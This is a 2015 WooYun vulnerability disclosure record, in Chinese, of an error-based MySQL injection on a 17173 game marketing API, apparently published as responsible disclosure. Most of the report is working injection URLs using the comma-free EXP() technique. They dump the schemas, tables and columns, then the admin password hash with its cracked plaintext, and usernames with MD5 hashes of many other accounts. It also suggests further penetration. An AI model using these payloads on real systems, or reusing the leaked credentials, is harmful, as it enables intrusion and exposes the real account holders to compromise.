{"id": 44565, "wybug_id": "wooyun-2015-099907", "wybug_title": "17173游戏某站点MySQL报错注入(不带逗号注入的猜解过程)", "wybug_corp": "17173游戏", "wybug_author": "lijiejie", "wybug_date": "2015-03-06 18:53", "wybug_open_date": "2015-04-20 18:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向公众公开  简要描述： 17173游戏某站点MySQL报错注入(不带逗号的报错) 详细说明：  updateXML，duplicate entry报错注入，都需要使用到逗号。那如果逗号被作为分隔符或者是过滤了呢？可以用exp函数报错！ Ref: http://zone.wooyun.org/content/18890   漏洞证明：  \nhttp://marketing.17173.com/Api/ShowData?id=aa%22%2bEXP(~(select%20*%20from%20(select%20user())a))%2b%22bb&t=1425612949962\n\n\n\nuser: act_admin@10.59.107.127\n进一步，猜数据库：\nhttp://marketing.17173.com/Api/ShowData?id=aa%22%2bEXP(~(select%20*%20from%20(select%20group_concat(schema_name)%20from%20INFORMATION_SCHEMA.SCHEMATA)a))%2b%22bb&t=1425612949962\n得到：\ninformation_schemaact_autoact_os_2013act_os_2014act_os_2015activity2010activity2011activity2012activity2013activity2014activity2015activity_manage\n查看activity_manage库中的数据表：\nhttp://marketing.17173.com/Api/ShowData?id=aa%22%2bEXP(~(select%20*%20from%20(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27activity_manage%27)a))%2b%22bb&t=1425612949962\n得到：\nactivitiesactivity_classifyactivity_commentactivity_functionactivity_joinactivity_joinrecordactivity_logactivity_rightusers\n再取users表的所有列：\nhttp://marketing.17173.com/Api/ShowData?id=aa%22%2bEXP(~(select%20*%20from%20(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)a))%2b%22bb&t=1425612949962\n\nuser_idusernamepasswdgroup_idnoteadminid\n接着猜解username，password，可以得到admin的密码是  f00e61dc5e9caadbb3a57fbd95f5f0bd,破解得到 actadmin!@#$%^\nadmin      f00e61dc5e9caadbb3a57fbd95f5f0bdLC0391    670b14728ad9902aecba32e22fa4f6bdLC0095    10334eb58085ce713fd970a1461d8e77wuhong   6cdb4956e4eb4d0d8495c6a98eff0f94lc0630     61ec7506bcbaf614f7fec0cbe9b0badaLC0176   c2d542de924e4b22f77da80267632207LC0059   81fa32c3d5abab6076250a9d75354f40LC0068   69cfc91a0131c110096724a22b63f166lc0499    91ce6699aa98b0b8692914f3eb4010baLC0067   93012eeab6bdf052b4e988aa1606da31LC0561   670b14728ad9902aecba32e22fa4f6bdLC0805   3d822f2886a31d2a0b5a7929c67c87ffLC0921   63998412bb2c639038ebc2fb4f246873LC0031   84e40b55f1e936075b2afc18c27d8fd8\n因为报错限制了文本的长度，一次获取不全，需要使用limit 10 offset 10这样的格式分片后，10行10行地输出，上面只是部分内容。不需要逗号，比如：\nselect group_concat(passwd) from activity_manage.users limit 10 offset 0)a\n测试到此为止，我们已经可以获取数据库中所有的内容了，可以查找进入后台，利用邮箱进行破解等后续渗透。   修复方案：  参数过滤和转义，特别是双引号   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-08 21:33 厂商回复： 感谢支持和关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-06 19:34 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  叼！    \n     2015-03-06 19:41 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  附带测试脚本...    \n     2015-03-06 19:57 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  李姐姐    \n     2015-04-07 23:15 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  叼、    \n     2015-04-21 09:13 |    \t\tsql小神 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 有些漏洞可以提，有些漏洞不可以提。)\t\t \n  姐姐就是叼    \n     2015-04-22 11:23 |    \t\t炯炯虾 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我来自地球)\t\t \n  http://www.w3resource.com/sql/arithmetic-functions/exp.php    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}